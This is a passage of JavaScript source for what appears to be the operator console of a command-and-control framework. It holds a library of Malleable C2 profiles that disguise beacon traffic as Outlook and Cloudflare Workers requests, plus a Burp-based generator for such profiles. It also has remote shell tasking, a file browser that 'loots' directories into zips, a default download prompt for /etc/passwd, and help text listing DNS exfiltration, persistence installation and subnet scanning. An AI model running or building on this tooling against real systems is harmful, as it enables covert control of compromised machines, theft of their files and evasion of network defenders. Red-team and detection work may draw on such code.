    set C    "US";
    set validity "365";
}

http-get {
    set uri "/owa/service.svc /api/v2.0/me/mailfolders/inbox/messages /api/v2.0/me/calendarview";

    client {
        header "Accept" "application/json; odata.metadata=minimal";
        header "X-OWA-CANARY" "sK9aL3mN7pQ2rT5u";
        header "X-AnchorMailbox" "user@contoso.com";

        metadata {
            base64url;
            prepend "Bearer eyJ0eXAi";
            header "Authorization";
        }
    }

    server {
        header "Content-Type" "application/json; odata.metadata=minimal; odata.streaming=true";
        header "X-CalculatedBETarget" "DM6PR12MB4567.namprd12.prod.outlook.com";
        header "X-MS-Diagnostics" "1;FRA;EXCH";

        output {
            mask;
            base64;
            prepend "{\\"@odata.context\\":\\"https://outlook.office365.com/api/v2.0/$metadata#Me/Messages\\",\\"value\\":[{\\"Id\\":\\"";
            append "\\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/owa/service.svc?action=SendMessage /api/v2.0/me/sendmail";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-OWA-ActionId" "9f2e1d3c-4b5a-6c7d-8e9f";

        id {
            base64url;
            header "X-OWA-CorrelationId";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            mask;
            base64;
            print;
        }
    }
}
`},
{name:"Cloudflare Workers",icon:"\u{26A1}",desc:"Blends with Cloudflare Workers edge compute and KV storage API traffic patterns.",tags:[["cdn","t-cdn"],["api","t-api"]],source:`# Cloudflare Workers Edge Profile
set sleeptime "40000";
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
set host_stage "false";

https-certificate {
    set CN   "workers.dev";
    set O    "Cloudflare, Inc.";
    set C    "US";
    set validity "365";
}

http-get {
    set uri "/cdn-cgi/trace /cdn-cgi/rum /api/kv/values";

    client {
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Encoding" "gzip, deflate, br";
        header "CF-Connecting-IP" "203.0.113.42";

        metadata {
            base64url;
            prepend "cf_clearance=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "CF-RAY" "8a2b3c4d5e6f7g8h-FRA";
        header "CF-Cache-Status" "DYNAMIC";
        header "Server" "cloudflare";

        output {
            mask;
            base64;
            prepend "{\\"success\\":true,\\"result\\":\\"";
            append "\\",\\"errors\\":[]}";
            print;
        }
    }
}

http-post {
    set uri "/api/kv/write /api/worker/invoke";

    client {
        header "Content-Type" "application/json";
        header "CF-Worker" "production";

        id {
            base64url;
            header "X-Request-Id";
        }

        output {
            mask;
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "CF-RAY" "8a2b3c4d5e6f7g8h-FRA";

        output {
            mask;
            base64;
            prepend "{\\"success\\":true,\\"result\\":\\"";
            append "\\"}";
            print;
        }
    }
}
`}
];

function showC2Library(){
  const ol = document.createElement("div");
  ol.className = "c2pe-lib-overlay";
  ol.onclick = e => { if(e.target===ol) ol.remove(); };
  let cards = C2PE_LIBRARY.map((p,i) =>
    `<div class="c2pe-lib-card" data-idx="${i}" data-name="${esc(p.name.toLowerCase())}" onclick="c2peLoadLib(${i})">
       <h4><span class="lib-icon">${p.icon}</span> ${esc(p.name)}</h4>
       <p>${esc(p.desc)}</p>
       <div class="c2pe-lib-tags">${p.tags.map(t => `<span class="c2pe-lib-tag ${t[1]}">${t[0]}</span>`).join("")}</div>
     </div>`
  ).join("");
  ol.innerHTML = `<div class="c2pe-lib-panel">
    <button class="c2pe-lib-close" onclick="this.closest('.c2pe-lib-overlay').remove()">&#10005;</button>
    <div class="c2pe-lib-hdr">
      <h3>&#128218; Profile Library</h3>
      <input type="text" placeholder="Search profiles..." oninput="c2peLibFilter(this.value)">
    </div>
    <div class="c2pe-lib-grid" id="c2pe-lib-grid">${cards}</div>
  </div>`;
  document.body.appendChild(ol);
}

function c2peLibFilter(q){
  q = q.toLowerCase();
  document.querySelectorAll(".c2pe-lib-card").forEach(c => {
    c.style.display = c.dataset.name.includes(q) ? "" : "none";
  });
}

function c2peLoadLib(idx){
  const p = C2PE_LIBRARY[idx];
  if(!p) return;
  const ta = document.getElementById("c2pe-textarea");
  if(!ta) return;
  ta.value = p.source;
  _c2ProfileSource = p.source;
  ta.dispatchEvent(new Event("input"));
  document.querySelector(".c2pe-lib-overlay")?.remove();
  toast("ok","C2 Profile","Loaded: "+p.name,3000);
}

function showBurpImport(){
  const overlay = document.createElement("div");
  overlay.className = "burp-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  overlay.innerHTML = `
<div class="burp-panel">
  <button class="loot-close" onclick="this.closest('.burp-overlay').remove()" style="position:absolute;top:8px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer">&#10005;</button>
  <h3>&#128270; Import from Burp Suite</h3>
  <p style="font-size:11px;color:var(--text2);margin:0 0 12px">Paste a raw HTTP request and its response from Burp Suite, ZAP, or any proxy. A Malleable C2 profile will be generated that mimics this traffic pattern.</p>

  <div class="burp-row">
    <div class="burp-col">
      <label>HTTP Request (raw)</label>
      <textarea id="burp-req" placeholder="GET /api/v2/telemetry HTTP/1.1\nHost: analytics.example.com\nAccept: application/json\nCookie: session=abc123\n\n"></textarea>
    </div>
    <div class="burp-col">
      <label>HTTP Response (raw, optional)</label>
      <textarea id="burp-res" placeholder="HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-cache\n\n{&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:[]}"></textarea>
    </div>
  </div>

  <div class="burp-section">Beacon Data Placement</div>
  <div class="burp-opts">
    <div>
      <label>Metadata (http-get)</label>
      <select id="burp-meta-loc">
        <option value="header" selected>Header</option>
        <option value="parameter">URL Parameter</option>
        <option value="body">Body (POST only)</option>
      </select>
      <input id="burp-meta-name" value="Cookie" placeholder="Header/param name" style="margin-top:4px">
    </div>
    <div>
      <label>Beacon ID (http-post)</label>
      <select id="burp-id-loc">
        <option value="parameter" selected>URL Parameter</option>
        <option value="header">Header</option>
        <option value="body">Body</option>
      </select>
      <input id="burp-id-name" value="sid" placeholder="Header/param name" style="margin-top:4px">
    </div>
    <div>
      <label>Encoding</label>
      <select id="burp-enc">
        <option value="base64url" selected>base64url</option>
        <option value="base64">base64</option>
        <option value="netbios">netbios</option>
        <option value="netbiosu">netbiosu</option>
      </select>
    </div>
  </div>

  <div class="burp-actions">
    <button onclick="this.closest('.burp-overlay').remove()">Cancel</button>
    <button class="burp-generate" onclick="burpGenerate()">&#9889; Generate Profile</button>
  </div>
</div>`;
  document.body.appendChild(overlay);
}

async function burpGenerate(){
  const req = document.getElementById("burp-req")?.value || "";
  const res = document.getElementById("burp-res")?.value || "";
  if(!req.trim()){ toast("warn","Burp Import","Paste a raw HTTP request",3000); return; }
  const enc = document.getElementById("burp-enc")?.value || "base64url";
  try{
    const data = await api("/api/server/c2-profile/from-burp", {
      method:"POST",
      body:JSON.stringify({
        request: req,
        response: res,
        metadata_location: document.getElementById("burp-meta-loc")?.value || "header",
        metadata_name: document.getElementById("burp-meta-name")?.value || "Cookie",
        metadata_encoding: enc,
        id_location: document.getElementById("burp-id-loc")?.value || "parameter",
        id_name: document.getElementById("burp-id-name")?.value || "sid",
        id_encoding: enc,
        output_encoding: enc,
      })
    });
    if(data.error){ toast("err","Burp Import",data.error,4000); return; }
    const ta = document.getElementById("c2pe-textarea");
    if(ta){
      ta.value = data.profile;
      _c2ProfileSource = data.profile;
      ta.dispatchEvent(new Event("input"));
    }
    document.querySelector(".burp-overlay")?.remove();
    toast("ok","Burp Import",`Profile generated from ${data.method} ${data.uri} (${data.headers_count} headers, ${data.params_count} params)`,5000);
  }catch(e){
    toast("err","Burp Import","Failed: "+e.message,4000);
  }
}

// ── Netstat view ──
const NET_SERVICES = {
  21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",67:"DHCP",68:"DHCP",
  80:"HTTP",110:"POP3",111:"RPC",135:"MSRPC",137:"NetBIOS",138:"NetBIOS",
  139:"SMB",143:"IMAP",161:"SNMP",389:"LDAP",443:"HTTPS",445:"SMB",
  465:"SMTPS",514:"Syslog",515:"LPD",587:"SMTP",631:"CUPS",636:"LDAPS",
  993:"IMAPS",995:"POP3S",1080:"SOCKS",1433:"MSSQL",1521:"Oracle",
  2049:"NFS",3306:"MySQL",3389:"RDP",5432:"Postgres",5900:"VNC",
  5985:"WinRM",5986:"WinRM-S",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",
  8888:"HTTP-Alt",9200:"Elastic",9300:"Elastic",27017:"MongoDB",
};
const NET_SUSPICIOUS = new Set([
  4444,5555,1234,31337,9999,6666,6667,6697,7777,8000,
  4443,2222,1337,13337,43,50050,
]);
const NET_INTEREST = {
  22:"highlight",23:"warn",135:"warn",139:"warn",445:"warn",
  3389:"highlight",5900:"highlight",5985:"highlight",5986:"highlight",
  1433:"highlight",3306:"highlight",5432:"highlight",6379:"highlight",
  389:"highlight",636:"highlight",
};

function parseNetstat(raw){
  const rows = [];
  const lines = raw.split("\n");
  for(const line of lines){
    const trimmed = line.trim();
    if(!trimmed || /^(Active|Proto|----)/.test(trimmed)) continue;
    // Linux: tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1234/sshd
    let m = trimmed.match(/^(tcp6?|udp6?)\s+\d+\s+\d+\s+(\S+)\s+(\S+)\s+(\S+)(?:\s+(\S+))?/);
    if(m){
      rows.push({proto:m[1],local:m[2],remote:m[3],state:m[4],proc:m[5]||""});
      continue;
    }
    // Windows: TCP 0.0.0.0:445 0.0.0.0:0 LISTENING
    m = trimmed.match(/^(TCP|UDP)\s+(\S+)\s+(\S+)\s+(\S+)/i);
    if(m){
      rows.push({proto:m[1].toLowerCase(),local:m[2],remote:m[3],state:m[4],proc:""});
    }
  }
  return rows;
}

function extractPort(addr){
  if(!addr) return null;
  const i = addr.lastIndexOf(":");
  if(i<0) return null;
  const p = parseInt(addr.substring(i+1),10);
  return isNaN(p)?null:p;
}

function assessConn(row){
  const lport = extractPort(row.local);
  const rport = extractPort(row.remote);
  const tags = [];
  if(lport && NET_SERVICES[lport]) tags.push({text:NET_SERVICES[lport],cls:"svc"});
  if(rport && NET_SERVICES[rport]) tags.push({text:NET_SERVICES[rport],cls:"svc"});
  if(lport && NET_SUSPICIOUS.has(lport)) tags.push({text:"⚠ suspicious port",cls:"warn"});
  if(rport && NET_SUSPICIOUS.has(rport)) tags.push({text:"⚠ suspicious port",cls:"warn"});
  const interest = (lport && NET_INTEREST[lport]) || (rport && NET_INTEREST[rport]);
  if(interest) tags.push({text: interest==="warn"?"attack surface":"pivot target",cls:interest});
  if(row.state && /ESTABLISHED/i.test(row.state)){
    const r = row.remote.replace(/:\d+$/,"");
    if(r && r!=="0.0.0.0" && r!=="*" && r!=="::" && !r.startsWith("127."))
      tags.push({text:"active",cls:"active"});
  }
  if(/LISTEN/i.test(row.state)) tags.push({text:"listening",cls:"listen"});
  return tags;
}

async function showNetstat(){
  if(!selectedAgent) return;
  const cmd = 'netstat -tlnp 2>/dev/null || netstat -an';
  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"shell", args:cmd, data:""})
  });
  openPanel("Network", '<div class="t-pending">Waiting for agent...</div>');
  if(panelPollTimer) clearInterval(panelPollTimer);
  panelPollTimer = setInterval(() => pollNetstatResult(cmd), 1500);
  pollHistory(selectedAgent);
}

async function pollNetstatResult(cmd){
  if(!selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="shell" && h.args===cmd);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null) return;
  if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
  const body = document.getElementById("panel-body");
  if(!body) return;
  if(last.status!=="ok"){ body.innerHTML='<div class="t-error">'+esc(last.output||"(error)")+'</div>'; return; }
  const rows = parseNetstat(last.output||"");
  if(!rows.length){ body.innerHTML='<div class="t-output">'+esc(last.output||"(no output)")+'</div>'; return; }

  const listen = rows.filter(r => /LISTEN/i.test(r.state));
  const established = rows.filter(r => /ESTABLISH/i.test(r.state));
  const other = rows.filter(r => !/LISTEN|ESTABLISH/i.test(r.state));
  const warnCount = rows.filter(r => {
    const lp = extractPort(r.local), rp = extractPort(r.remote);
    return (lp && NET_SUSPICIOUS.has(lp)) || (rp && NET_SUSPICIOUS.has(rp));
  }).length;

  let html = '<div class="ns-summary">'
    +'<div class="ns-stat"><span class="ns-num">'+rows.length+'</span><span class="ns-lbl">Total</span></div>'
    +'<div class="ns-stat listen"><span class="ns-num">'+listen.length+'</span><span class="ns-lbl">Listening</span></div>'
    +'<div class="ns-stat active"><span class="ns-num">'+established.length+'</span><span class="ns-lbl">Established</span></div>';
  if(warnCount) html += '<div class="ns-stat warn"><span class="ns-num">'+warnCount+'</span><span class="ns-lbl">⚠ Suspicious</span></div>';
  html += '</div>';

  function renderSection(title, items){
    if(!items.length) return "";
    let s = '<div class="ns-section"><div class="ns-title">'+title+' ('+items.length+')</div>';
    s += '<table class="ns-table"><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>State</th><th>Process</th><th>Assessment</th></tr></thead><tbody>';
    for(const r of items){
      const tags = assessConn(r);
      const hasWarn = tags.some(t => t.cls==="warn");
      s += '<tr class="'+(hasWarn?"ns-row-warn":"")+'"><td>'+esc(r.proto)+'</td>'
        +'<td class="ns-addr">'+esc(r.local)+'</td>'
        +'<td class="ns-addr">'+esc(r.remote)+'</td>'
        +'<td>'+esc(r.state)+'</td>'
        +'<td>'+esc(r.proc)+'</td>'
        +'<td>'+tags.map(t=>'<span class="ns-tag '+t.cls+'">'+t.text+'</span>').join("")+'</td></tr>';
    }
    s += '</tbody></table></div>';
    return s;
  }

  html += renderSection("Listening", listen);
  html += renderSection("Established", established);
  html += renderSection("Other", other);
  body.innerHTML = html;
}

// ── File browser ──
let fbPath = "/";
let fbVisible = false;
let fbData = [];
let fbTreeDirs = {};
let fbSelected = null;

const FB_ICONS = {
  directory:"📁", code:"📝", text:"📄", image:"🖼️", archive:"📦",
  binary:"⚙️", cert:"🔐", database:"🗄️", file:"📄"
};

function fbFormatSize(bytes){
  if(bytes < 1024) return bytes + " B";
  if(bytes < 1048576) return (bytes/1024).toFixed(1) + " KB";
  if(bytes < 1073741824) return (bytes/1048576).toFixed(1) + " MB";
  return (bytes/1073741824).toFixed(2) + " GB";
}

function openFileBrowser(path){
  if(!selectedAgent) return;
  if(!path && fbVisible){ closePanel(); return; }
  fbPath = path || "/";
  fbVisible = true;
  fbSelected = null;

  openPanel("File Browser", `
    <div class="filebrowser">
      <div class="fb-tree" id="fb-tree"></div>
      <div class="fb-main">
        <div class="fb-path">
          <button onclick="openFileBrowser(parentDir(fbPath))">&#11014;</button>
          <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">` + esc(fbPath) + `</span>
          <button onclick="openFileBrowser(fbPath)">&#8635;</button>
        </div>
        <div class="fb-upload-zone" id="fb-drop" onclick="fbUploadClick()"
             ondragover="event.preventDefault();this.classList.add('drag-over')"
             ondragleave="this.classList.remove('drag-over')"
             ondrop="event.preventDefault();this.classList.remove('drag-over');fbDropUpload(event.dataTransfer.files)">
          &#11014; Drop files or click to upload
        </div>
        <div class="fb-list" id="fb-list"><div class="t-pending">Loading...</div></div>
        <div class="fb-detail" id="fb-detail" style="display:none"></div>
      </div>
    </div>`);

  fbLoadDir(fbPath);
}

async function fbLoadDir(path){
  fbPath = path;
  fbSelected = null;
  const detail = document.getElementById("fb-detail");
  if(detail) detail.style.display = "none";
  const pathEl = document.querySelector(".fb-path span");
  if(pathEl) pathEl.textContent = fbPath;
  const list = document.getElementById("fb-list");
  if(list) list.innerHTML = '<div class="t-pending">Loading...</div>';

  await api("/api/agents/"+selectedAgent+"/task",{
    method:"POST", body:JSON.stringify({cmd:"lsjson", args:path, data:""})
  });
  pollHistory(selectedAgent);
  setTimeout(fbPollResult, 1500);
}

async function fbPollResult(){
  if(!fbVisible || !selectedAgent) return;
  const hist = await api("/api/agents/"+selectedAgent+"/history");
  const matches = hist.filter(h => h.cmd==="lsjson" && h.args===fbPath);
  const last = matches[matches.length-1];
  if(!last || last.status==="pending" || last.status===null){
    setTimeout(fbPollResult, 1000);
    return;
  }
  if(last.status==="ok" && last.output){
    let parsed;
    try{ parsed = JSON.parse(last.output); }catch(e){ parsed = null; }
    if(parsed && parsed.entries){
      fbData = parsed.entries;
      fbRenderList();
      fbUpdateTree();
      return;
    }
  }
  const list = document.getElementById("fb-list");
  if(list) list.innerHTML = '<div class="t-system">Could not read directory</div>';
}

function fbRenderList(){
  const list = document.getElementById("fb-list");
  if(!list) return;
  list.innerHTML = "";
  const dirs = fbData.filter(e => e.is_dir).sort((a,b) => a.name.localeCompare(b.name));
  const files = fbData.filter(e => !e.is_dir).sort((a,b) => a.name.localeCompare(b.name));
  [...dirs, ...files].forEach(f => {
    const entry = document.createElement("div");
    const isDir = f.is_dir;
    entry.className = "fb-entry " + (isDir ? "dir" : "file");
    if(fbSelected && fbSelected.name === f.name) entry.classList.add("selected");
    const fullPath = fbPath.endsWith("/") ? fbPath+f.name : fbPath+"/"+f.name;
    const ico = FB_ICONS[f.type] || FB_ICONS.file;
    const sizeStr = isDir ? "" : fbFormatSize(f.size||0);
    const mtime = (f.mtime||"").substring(0,16);
    const ftype = f.type || "";

    let html = '<span class="ico">'+ico+'</span>'
      +'<span class="name">'+esc(f.name)+(f.is_link?" → "+esc(f.link_target||""):"")+'</span>';
    if(ftype && !isDir) html += '<span class="ftype '+esc(ftype)+'">'+esc(ftype)+'</span>';
    html += '<span class="size">'+esc(sizeStr)+'</span>'
      +'<span class="mtime">'+esc(mtime)+'</span>';
    html += '<span class="actions">';
    if(isDir){
      html += '<button onclick="event.stopPropagation();fbLootDir(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#128142;</button>';
    } else {
      html += '<button onclick="event.stopPropagation();fbDownloadFile(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#11015;</button>'
        +'<button onclick="event.stopPropagation();document.getElementById(\'cmd-input\').value=\'cat '+esc(fullPath)+'\';document.getElementById(\'cmd-input\').focus()">&#128065;</button>';
    }
    html += '</span>';
    html += '<span class="perm">'+esc(f.mode||"")+'</span>';
    entry.innerHTML = html;

    entry.onclick = e => {
      if(e.target.closest(".actions")) return;
      if(isDir && !e.ctrlKey){ fbLoadDir(fullPath); return; }
      fbSelected = f;
      fbShowDetail(f, fullPath);
      list.querySelectorAll(".fb-entry").forEach(el => el.classList.remove("selected"));
      entry.classList.add("selected");
    };
    list.appendChild(entry);
  });
  if(!fbData.length) list.innerHTML = '<div class="t-system">Empty directory</div>';
}

function fbShowDetail(f, fullPath){
  const detail = document.getElementById("fb-detail");
  if(!detail) return;
  detail.style.display = "block";
  const ico = FB_ICONS[f.type] || FB_ICONS.file;
  let html = '<div class="fd-header"><span class="fd-ico">'+ico+'</span>'
    +'<span class="fd-name">'+esc(f.name)+'</span></div>'
    +'<div class="fd-grid">';
  html += '<span class="fd-lbl">Path</span><span class="fd-val">'+esc(fullPath)+'</span>';
  html += '<span class="fd-lbl">Type</span><span class="fd-val highlight">'+esc(f.type||"file")+'</span>';
  html += '<span class="fd-lbl">Size</span><span class="fd-val">'+esc(fbFormatSize(f.size||0))+' ('+esc(String(f.size||0))+' bytes)</span>';
  html += '<span class="fd-lbl">Mode</span><span class="fd-val" style="font-family:var(--mono)">'+esc(f.mode||"?")+'</span>';
  if(f.owner) html += '<span class="fd-lbl">Owner</span><span class="fd-val">'+esc(f.owner)+(f.group?":"+esc(f.group):"")+'</span>';
  html += '<span class="fd-lbl">Modified</span><span class="fd-val">'+esc(f.mtime||"?")+'</span>';
  html += '<span class="fd-lbl">Accessed</span><span class="fd-val">'+esc(f.atime||"?")+'</span>';
  html += '<span class="fd-lbl">Created</span><span class="fd-val">'+esc(f.ctime||"?")+'</span>';
  if(f.is_link) html += '<span class="fd-lbl">Link</span><span class="fd-val warn">→ '+esc(f.link_target||"?")+'</span>';
  if(f.type==="cert") html += '<span class="fd-lbl">⚠</span><span class="fd-val warn">Certificate / Key file</span>';
  html += '</div>';
  const ep = esc(fullPath.replace(/'/g,"\\'"));
  html += '<div class="fd-actions">';
  if(f.is_dir){
    html += '<button class="fd-btn loot" onclick="fbLootDir(\''+ep+'\')">&#128142; Loot (zip)</button>';
    html += '<button class="fd-btn" onclick="fbLoadDir(\''+ep+'\')">&#128194; Open</button>';
  } else {
    html += '<button class="fd-btn dl" onclick="fbDownloadFile(\''+ep+'\')">&#11015; Download</button>';
    html += '<button class="fd-btn" onclick="document.getElementById(\'cmd-input\').value=\'cat '+ep+'\';document.getElementById(\'cmd-input\').focus()">&#128065; View</button>';
  }
  html += '<button class="fd-btn up" onclick="fbUploadTo(\''+ep+'\')">&#11014; Upload here</button>';
  html += '</div>';
  detail.innerHTML = html;
}

function fbDownloadFile(path){
  if(!selectedAgent) return;
  const inp = document.getElementById("cmd-input");
  inp.value = "download " + path;
  sendCmd();
}

function fbLootDir(path){
  if(!selectedAgent) return;
  const inp = document.getElementById("cmd-input");
  inp.value = "loot " + path;
  sendCmd();
}

function fbUploadTo(path){
  if(!selectedAgent) return;
  const input = document.createElement("input");
  input.type = "file";
  input.onchange = async () => {
    const file = input.files[0];
    if(!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const b64 = reader.result.split(",")[1];
      const dest = path.endsWith("/") ? path + file.name : path + "/" + file.name;
      const inp = document.getElementById("cmd-input");
      inp.value = "upload " + dest + " " + b64;
      sendCmd();
    };
    reader.readAsDataURL(file);
  };
  input.click();
}

async function showLootViewer(){
  const overlay = document.createElement("div");
  overlay.className = "loot-overlay";
  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
  const panel = document.createElement("div");
  panel.className = "loot-panel";
  panel.innerHTML = '<h2>&#128142; Loot Vault</h2><div class="loot-loading">Loading...</div>';
  overlay.appendChild(panel);
  document.body.appendChild(overlay);
  try {
    const items = await api("/api/loot");
    if(!items.length){
      panel.innerHTML = '<h2>&#128142; Loot Vault</h2><p class="loot-empty">No loot collected yet. Use the file browser to loot directories.</p>';
      return;
    }
    let html = '<h2>&#128142; Loot Vault</h2><button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button><div class="loot-list">';
    items.forEach(item => {
      const sizeStr = item.size > 1048576 ? (item.size/1048576).toFixed(1)+" MB" : (item.size/1024).toFixed(1)+" KB";
      const icon = item.filename.endsWith(".zip") ? "📦" : "📄";
      const dlUrl = "/api/loot/"+encodeURIComponent(item.agent_id)+"/"+encodeURIComponent(item.filename);
      html += '<div class="loot-item">'
        + '<span class="loot-ico">'+icon+'</span>'
        + '<div class="loot-info">'
        + '<a class="loot-name" href="#" onclick="event.preventDefault();lootSave(\''+esc(dlUrl)+'\',\''+esc(item.filename)+'\')">'+esc(item.filename)+'</a>'
        + '<span class="loot-meta">'+esc(item.agent_id)+' &middot; '+sizeStr+(item.type==="download"?" &middot; download":"")+'</span>'
        + '</div>'
        + '<button class="loot-dl" onclick="lootSave(\''+esc(dlUrl)+'\',\''+esc(item.filename)+'\')" title="Download">⬇</button>'
        + '</div>';
    });
    html += '</div>';
    panel.innerHTML = html;
  } catch(e) {
    panel.innerHTML = '<h2>&#128142; Loot Vault</h2><p class="loot-empty">Error loading loot: '+esc(e.message)+'</p>';
  }
}

async function lootSave(url, filename){
  try {
    const r = await fetch(url, {headers:H});
    if(!r.ok){ toast("warn","Loot","Download failed: "+r.status,3000); return; }
    const blob = await r.blob();
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    a.click();
    URL.revokeObjectURL(a.href);
  } catch(e){ toast("warn","Loot","Download error: "+e.message,3000); }
}

function fbUpdateTree(){
  const tree = document.getElementById("fb-tree");
  if(!tree) return;
  const dirs = fbData.filter(e => e.is_dir).sort((a,b) => a.name.localeCompare(b.name));
  fbTreeDirs[fbPath] = dirs.map(d => d.name);
  let html = '<div class="fb-tree-node'+(fbPath==="/"?" active":"")+'" onclick="fbLoadDir(\'/\')">'
    +'<span class="t-ico">💻</span><span class="t-name">/</span></div>';
  html += fbBuildTreeHTML("/", 0);
  tree.innerHTML = html;
}

function fbBuildTreeHTML(path, depth){
  if(depth > 6) return "";
  const children = fbTreeDirs[path];
  if(!children) return "";
  let html = '<div class="fb-tree-children">';
  children.forEach(name => {
    const full = path.endsWith("/") ? path+name : path+"/"+name;
    const isActive = fbPath === full;
    const hasChildren = fbTreeDirs[full];
    html += '<div class="fb-tree-node'+(isActive?" active":"")+'" onclick="fbLoadDir(\''+esc(full.replace(/'/g,"\\'"))+'\')">'
      +'<span class="t-ico">'+(hasChildren?"📂":"📁")+'</span>'
      +'<span class="t-name">'+esc(name)+'</span></div>';
    if(hasChildren) html += fbBuildTreeHTML(full, depth+1);
  });
  html += '</div>';
  return html;
}

function parentDir(p){
  const parts = p.replace(/\/$/,"").split("/");
  parts.pop();
  return parts.join("/") || "/";
}

function fbUploadClick(){
  const fi = document.createElement("input");
  fi.type = "file";
  fi.multiple = true;
  fi.onchange = () => fbDropUpload(fi.files);
  fi.click();
}

async function fbDropUpload(files){
  if(!selectedAgent || !files.length) return;
  for(const file of files){
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let b64 = "";
    const chunk = 8192;
    for(let i=0;i<bytes.length;i+=chunk){
      b64 += String.fromCharCode.apply(null, bytes.subarray(i, i+chunk));
    }
    b64 = btoa(b64);
    const dest = fbPath.endsWith("/") ? fbPath+file.name : fbPath+"/"+file.name;
    await api("/api/agents/"+selectedAgent+"/task",{
      method:"POST", body:JSON.stringify({cmd:"upload", args:dest, data:b64})
    });
  }
  const zone = document.getElementById("fb-drop");
  if(zone) zone.innerHTML = "&#10003; "+files.length+" file"+(files.length>1?"s":"")+" queued for upload";
  pollHistory(selectedAgent);
  setTimeout(() => fbLoadDir(fbPath), 4000);
}

function fbDownloadFile(path){
  if(!selectedAgent) return;
  quickCmd("download", path, "Download: "+path.split("/").pop());
}

// ── Upload ──
function triggerUpload(){
  if(!selectedAgent) return;
  const remotePath = prompt("Remote path to write file to:", "/tmp/");
  if(!remotePath) return;
  const fileInput = document.createElement("input");
  fileInput.type = "file";
  fileInput.onchange = async () => {
    const file = fileInput.files[0];
    if(!file) return;
    const buf = await file.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let b64 = "";
    const chunk = 8192;
    for(let i=0;i<bytes.length;i+=chunk){
      b64 += String.fromCharCode.apply(null, bytes.subarray(i, i+chunk));
    }
    b64 = btoa(b64);
    const dest = remotePath.endsWith("/") ? remotePath+file.name : remotePath;
    await api("/api/agents/"+selectedAgent+"/task",{
      method:"POST", body:JSON.stringify({cmd:"upload", args:dest, data:b64})
    });
    pollHistory(selectedAgent);
  };
  fileInput.click();
}

// ── Download ──
function promptDownload(){
  if(!selectedAgent) return;
  const path = prompt("Remote file path to download:", "/etc/passwd");
  if(!path) return;
  quickCmd("download", path);
}

// ── Help ──
function showHelp(){
  openPanel("Help", `
    <div class="t-info">━━━ Available commands ━━━</div>
    <div class="t-output">  shell &lt;cmd&gt;       Execute shell command</div>
    <div class="t-output">  ls &lt;path&gt;         List directory</div>
    <div class="t-output">  cat &lt;path&gt;        Read file contents</div>
    <div class="t-output">  pwd               Print working directory</div>
    <div class="t-output">  cd &lt;path&gt;         Change directory</div>
    <div class="t-output">  cp &lt;src&gt; &lt;dst&gt;    Copy file</div>
    <div class="t-output">  mv &lt;src&gt; &lt;dst&gt;    Move/rename file</div>
    <div class="t-output">  rm &lt;path&gt;         Remove file/directory</div>
    <div class="t-output">  mkdir &lt;path&gt;      Create directory</div>
    <div class="t-output">  chmod &lt;mode&gt; &lt;f&gt;  Change permissions</div>
    <div class="t-output">  write &lt;path&gt;      Write text to file (via data)</div>
    <div class="t-output">  upload &lt;path&gt;     Upload file to agent</div>
    <div class="t-output">  download &lt;path&gt;   Download file from agent</div>
    <div class="t-output">  exfil &lt;path&gt;      Exfiltrate file via DNS</div>
    <div class="t-output">  sleep &lt;s&gt; &lt;j%&gt;    Set beacon interval + jitter</div>
    <div class="t-output">  persist &lt;method&gt;  Install persistence (auto/registry/startup/schtask/crontab/bashrc/systemd)</div>
    <div class="t-output">  unpersist &lt;method&gt; Remove persistence</div>
    <div class="t-output">  netscan [subnet]  Scan /24 subnet for hosts</div>
    <div class="t-output">  arptable          Show ARP neighbor table</div>
    <div class="t-output">  kill              Terminate beacon</div>
    <div class="t-info">━━━━━━━━━━━━━━━━━━━━━━━━</div>
  `);
}

// ── Beacon config panel ──
async function showBeaconConfig(){
  if(!selectedAgent) return;
  const info = await api("/api/agents/"+selectedAgent);
  const curInterval = info.interval || 5;
  openPanel("Beacon Config", `
    <div style="padding:4px 0">
      <div class="t-info" style="margin-bottom:12px">&#9881; Sleep / Jitter</div>
      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
        <label style="color:var(--text2);font-size:12px;width:70px">Interval</label>
        <input id="cfg-interval" type="number" min="1" max="86400" value="${curInterval}"
          style="width:80px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:13px">
        <span style="color:var(--text2);font-size:12px">seconds</span>
      </div>
      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
        <label style="color:var(--text2);font-size:12px;width:70px">Jitter</label>
        <input id="cfg-jitter" type="range" min="0" max="90" value="10" style="flex:1"
          oninput="document.getElementById('cfg-jitter-val').textContent=this.value+'%'">
